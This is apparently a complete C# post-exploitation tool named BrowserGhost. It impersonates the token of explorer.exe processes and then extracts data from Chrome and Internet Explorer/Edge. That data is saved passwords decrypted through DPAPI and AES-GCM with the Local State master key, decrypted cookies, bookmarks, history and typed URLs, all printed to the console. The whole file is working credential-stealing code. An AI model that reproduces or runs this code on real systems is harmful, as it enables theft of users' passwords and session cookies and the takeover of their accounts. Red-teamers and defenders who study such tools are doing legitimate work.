using System;
using System.Data;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.IO;
using CS_SQLite3;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using SharpEdge;


namespace BrowserGhost
{
    class Program
    {


        // Constants that are going to be used during our procedure.
        private const int ANYSIZE_ARRAY = 1;
        public static uint SE_PRIVILEGE_ENABLED = 0x00000002;
        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public static uint STANDARD_RIGHTS_READ = 0x00020000;
        public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001;
        public static uint TOKEN_DUPLICATE = 0x00000002;
        public static uint TOKEN_IMPERSONATE = 0x00000004;
        public static uint TOKEN_QUERY = 0x00000008;
        public static uint TOKEN_QUERY_SOURCE = 0x00000010;
        public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static uint TOKEN_ADJUST_GROUPS = 0x00000040;
        public static uint TOKEN_ADJUST_DEFAULT = 0x00000080;
        public static uint TOKEN_ADJUST_SESSIONID = 0x00000100;
        public static uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;
        public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;

            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
            public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
            public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004;
            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000;
        }

        // Luid Structure Definition
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public UInt32 LowPart;
            public Int32 HighPart;
        }

        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PRIVILEGE_SET
        {
            public uint PrivilegeCount;
            public uint Control;  // use PRIVILEGE_SET_ALL_NECESSARY

            public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privilege;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }



        // LookupPrivilegeValue
        [DllImport("advapi32.dll")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        //回退到原始权限
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool RevertToSelf();


        // OpenProcess
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId);
        public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
        {
            return OpenProcess(flags, false, proc.Id);
        }

        // OpenProcessToken
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        // DuplicateToken
        [DllImport("advapi32.dll")]
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

        // SetThreadToken
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

        // AdjustTokenPrivileges
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
           [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,
           ref TOKEN_PRIVILEGES NewState,
           UInt32 BufferLengthInBytes,
           ref TOKEN_PRIVILEGES PreviousState,
           out UInt32 ReturnLengthInBytes);

        // GetCurrentProcess
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();


        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool PrivilegeCheck(
            IntPtr ClientToken,
            ref PRIVILEGE_SET RequiredPrivileges,
            out bool pfResult
            );

        // Now I will create functions that use the above definitions, so we can use them directly from PowerShell :P
        public static bool IsPrivilegeEnabled(string Privilege)
        {
            bool ret;
            LUID luid = new LUID();
            IntPtr hProcess = GetCurrentProcess();
            IntPtr hToken;
            if (hProcess == IntPtr.Zero) return false;
            if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken)) return false;
            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;
            PRIVILEGE_SET privs = new PRIVILEGE_SET { Privilege = new LUID_AND_ATTRIBUTES[1], Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };
            privs.Privilege[0].Luid = luid;
            privs.Privilege[0].Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;
            if (!PrivilegeCheck(hToken, ref privs, out ret)) return false;
            return ret;
        }

        public static bool EnablePrivilege(string Privilege)
        {
            LUID luid = new LUID();
            IntPtr hProcess = GetCurrentProcess();
            IntPtr hToken;
            if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;
            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;
            // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege.
            LUID_AND_ATTRIBUTES luAttr = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED };
            // Now we create a TOKEN_PRIVILEGES structure with our modifications
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new LUID_AND_ATTRIBUTES[1] };
            tp.Privileges[0] = luAttr;
            TOKEN_PRIVILEGES oldState = new TOKEN_PRIVILEGES(); // Our old state.
            if (!AdjustTokenPrivileges(hToken, false, ref tp, (UInt32)Marshal.SizeOf(tp), ref oldState, out UInt32 returnLength)) return false;
            return true;
        }

        public static bool ImpersonateProcessToken(int pid)
        {
            IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation, true, pid);
            if (hProcess == IntPtr.Zero) return false;
            IntPtr hToken;
            if (!OpenProcessToken(hProcess, TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out hToken)) return false;
            IntPtr DuplicatedToken = new IntPtr();
            if (!DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            if (!SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;
            return true;
        }
        private static string GetProcessUserName(int pID)
        {


            string text1 = null;


            SelectQuery query1 =
              new SelectQuery("Select * from Win32_Process WHERE processID=" + pID);
            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1);


            try
            {
                foreach (ManagementObject disk in searcher1.Get())
                {
                    ManagementBaseObject inPar = null;
                    ManagementBaseObject outPar = null;


                    inPar = disk.GetMethodParameters("GetOwner");


                    outPar = disk.InvokeMethod("GetOwner", inPar, null);


                    text1 = outPar["User"].ToString();
                    break;
                }
            }
            catch
            {
                text1 = "SYSTEM";
            }


            return text1;
        }

        public static byte[] GetMasterKey(string filePath)
        {
            //Key saved in Local State file

            byte[] masterKey = new byte[] { };

            if (File.Exists(filePath) == false)
                return null;

            //Get key with regex.
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64
            }

            //Trim first 5 bytes. Its signature "DPAPI"
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }



        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes

            //trim first 3 bytes(signature "v10") and take 12 bytes after signature.
            Array.Copy(encryptedData, 3, iv, 0, 12);

            try
            {
                //encryptedData without IV
                byte[] Buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16]; //AuthTag
                byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data

                //Last 16 bytes for tag
                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

                //encrypted password
                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

                AesGcm aesDecryptor = new AesGcm();
                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static bool Chrome_history()
        {
            string chrome_History_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
            if (File.Exists(chrome_History_path) == true)
            {
                
                string cookie_tempFile = Path.GetTempFileName();
                File.Copy(chrome_History_path, cookie_tempFile, true);

                Console.WriteLine("\t[+] Copy {0} to {1}", chrome_History_path, cookie_tempFile);

                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);
                string query = "select url,title from urls";
                DataTable resultantQuery = database.ExecuteQuery(query);
                foreach (DataRow row in resultantQuery.Rows)
                {
                    string url;
                    string title;
                    try
                    {
                        url = (string)row["url"];
                        title = (string)row["title"];
                    }
                    catch
                    {
                        continue;

                    }
                    
                    
                    Console.WriteLine("\t{0} \t {1}", url, title);

                }
                database.CloseDatabase();
                System.IO.File.Delete(cookie_tempFile);
                Console.WriteLine("\t[+] Delete File {0}", cookie_tempFile);

            }
            else
            {
                Console.WriteLine("[-] {0} Not Found!", chrome_History_path);
            }

            return true;
        }



        public static bool Chrome_cookies()
        {
            string chrome_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
            if (File.Exists(chrome_cookie_path) == true)
            {
                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State";
                string cookie_tempFile = Path.GetTempFileName();
                File.Copy(chrome_cookie_path, cookie_tempFile, true);

                Console.WriteLine("\t[+] Copy {0} to {1}", chrome_cookie_path, cookie_tempFile);

                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);
                string query = "SELECT host_key, name,encrypted_value FROM cookies";
                DataTable resultantQuery = database.ExecuteQuery(query);
                foreach (DataRow row in resultantQuery.Rows)
                {
                    string host_key = (string)row["host_key"].ToString();
                    string name = (string)row["name"].ToString();
                    byte[] cookieBytes = Convert.FromBase64String((string)row["encrypted_value"].ToString());
                    string cookie_value;
                    try
                    {
                        //老版本解密
                        cookie_value = Encoding.UTF8.GetString(ProtectedData.Unprotect(cookieBytes, null, DataProtectionScope.CurrentUser));

                        //Console.WriteLine("{0} {1} {2}", originUrl, username, password);
                    }
                    catch (Exception ex) //如果异常了就用新加密方式尝试
                    {

                        byte[] masterKey = GetMasterKey(chrome_state_file);
                        cookie_value = DecryptWithKey(cookieBytes, masterKey);


                    }
                    Console.WriteLine("\t[{0}] \t {1}={2}",host_key,name, cookie_value);
                    
                }
                database.CloseDatabase();
                System.IO.File.Delete(cookie_tempFile);
                Console.WriteLine("\t[+] Delete File {0}", cookie_tempFile);

            }
            else
            {
                Console.WriteLine("[-] {0} Not Found!", chrome_cookie_path);
            }

            return true;
        }


        //偷个懒 后面再解析json
        public static bool Chrome_books()
        {
            string chrome_book_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Bookmarks";
            if (File.Exists(chrome_book_path) == true)
            {

                string booktext = File.ReadAllText(chrome_book_path);
                Console.WriteLine(booktext);


            }
            else
            {
                Console.WriteLine("[-] {0} Not Found!", chrome_book_path);
            }
                
            return true;
        }
        public static bool Chrome_logins()
        {
            //copy login data
            string login_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";

            if (File.Exists(login_data_path) == true)
            {
                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State";
                string login_data_tempFile = Path.GetTempFileName();
                File.Copy(login_data_path, login_data_tempFile, true);

                Console.WriteLine("\t[+] Copy {0} to {1}", login_data_path, login_data_tempFile);

                SQLiteDatabase database = new SQLiteDatabase(login_data_tempFile);
                string query = "SELECT origin_url, username_value, password_value FROM logins";
                DataTable resultantQuery = database.ExecuteQuery(query);

                foreach (DataRow row in resultantQuery.Rows)
                {
                    string url;
                    string username;
                    string password;
                    string crypt_password;
                    url = (string)row["origin_url"].ToString();
                    username = (string)row["username_value"].ToString();
                    crypt_password = row["password_value"].ToString();


                    byte[] passwordBytes = Convert.FromBase64String(crypt_password);
                    
                    try
                    {
                        //老版本解密
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));

                        //Console.WriteLine("{0} {1} {2}", originUrl, username, password);
                    }
                    catch (Exception ex) //如果异常了就用新加密方式尝试
                    {

                        byte[] masterKey = GetMasterKey(chrome_state_file);
                        password = DecryptWithKey(passwordBytes, masterKey);


                    }


                    Console.WriteLine("\t[URL] -> {0}\n\t[USERNAME] -> {1}\n\t[PASSWORD] -> {2}\n", url, username, password);
                    

                }
                database.CloseDatabase();
                System.IO.File.Delete(login_data_tempFile);
                Console.WriteLine("\t[+] Delete File {0}", login_data_tempFile);
            }
            else
            {
                Console.WriteLine("[-] {0} Not Found!", login_data_path);
            }

                
            
            return false;
        }

        public static bool IE_history()//system 获取history时有点问题 
        {
            string info = "";

            RegistryKey Key;

            Key = Registry.CurrentUser;
            RegistryKey myreg = Key.OpenSubKey("Software\\Microsoft\\Internet Explorer\\TypedURLs");
            string[] urls = new string[26];

            for (int i = 1; i < 26; i++)
            {
                try
                {
                    info = myreg.GetValue("url" + i.ToString()).ToString();
                    
                    urls[i] = info;
                }
                catch
                {
                    ;
                }
            }
            foreach (string url in urls)
            {
                if (url != null)
                {
                    Console.WriteLine("\t{0}", url);
                }

            }

          
            return true;
        }

        public static bool IE_books()
        {
            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

            string[] files = Directory.GetFiles(book_path, "*.url", SearchOption.AllDirectories);

            foreach (string url_file_path in files)
            {
                if (File.Exists(url_file_path) == true)
                {

                    string booktext = File.ReadAllText(url_file_path);

                    Match match = Regex.Match(booktext, @"URL=(.*?)\n");
                    Console.WriteLine("\t" + url_file_path);
                    Console.WriteLine("\t\t" + match.Value);

                }
            }

            return true;
        }

        static void Main(string[] args)
        {


            Console.WriteLine("[+] Current user {0}", Environment.UserName);

            //先获取 explorer.exe 进程
            foreach (Process p in Process.GetProcesses())
            {
                int pid = p.Id;
                string processname = p.ProcessName;
                string process_of_user = GetProcessUserName(pid);

                //                Recvtoself
                if (processname == "explorer")
                {

                    Console.WriteLine("[*] [{0}] [{1}] [{2}]", pid, processname, process_of_user);

                    ImpersonateProcessToken(pid);
                    Console.WriteLine("[*] Impersonate user {0}", Environment.UserName);
                    Console.WriteLine("[*] Current user {0}", Environment.UserName);

                    Console.WriteLine("===============Chrome=============");
                    //密码
                    Console.WriteLine("\n[*]Get Chrome Login Data");
                    Chrome_logins();
                    
                    //获取书签
                    Console.WriteLine("\n[*]Get Chrome Bookmarks");
                    Chrome_books();

                    //cookie
                    Console.WriteLine("\n[*]Get Chrome Cookie");
                    Chrome_cookies();

                    Console.WriteLine("\n[*]Get Chrome History");
                    Chrome_history();

                    //-----------------------IE----------------

                    Console.WriteLine("===============IE=============");

                    

                    Console.WriteLine("\n[*]Get IE Books");
                    IE_books();

                    Console.WriteLine("\n[*]Get IE Password");
                    Edge.GetLogins(); //.net2 提取这个密码太复杂了 参考至 https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs

                    Console.WriteLine("\n[*]Get IE History");
                    IE_history();
                    
                    //回退权限
                    RevertToSelf();
                    Console.WriteLine("[*] Recvtoself");
                    Console.WriteLine("[*] Current user {0}", Environment.UserName);
                    

                }

            }

        }




    }
}

